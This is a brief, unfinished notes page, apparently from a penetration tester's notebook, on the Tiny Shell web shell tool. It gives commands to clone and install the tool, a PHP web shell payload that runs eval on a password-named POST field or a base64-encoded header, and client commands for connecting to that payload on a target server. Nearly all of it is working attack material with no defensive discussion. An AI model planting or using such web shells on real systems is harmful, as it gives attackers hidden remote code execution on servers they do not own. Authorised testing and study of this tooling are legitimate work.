
>[!info]
>This note is still in development.
### Overview
---
- TBA

### General Usage
---

**Installation**
```shell
# Download Tiny Shell and dependencies
git clone https://github.com/threatexpress/tinyshell
cd tinyshell
pip install docopt
pip install requests
```

**Payload**
```php
# Payload
<?php @eval(<insert_here>);?>
<!-- Unencoded Post:		 $_POST['password'] -->
<!-- Base64 Encoded Post:	 base64_decode($_POST['token']) -->
<!-- Base64 Encoded Header:  base64_decode($_SERVER['HTTP_PSESSION']) -->
```

**Usage**
```shell
# Base64 Encoded Post
python2 tinyshell.py --url=http://<ip_addr>/<payload_file> --language=php --password=token --mode=base64_post

# Base64 Encoded Header
python2 tinyshell.py --url=http://<ip_addr>/<payload_file> --language=php --password=psession --mode=base64_header
```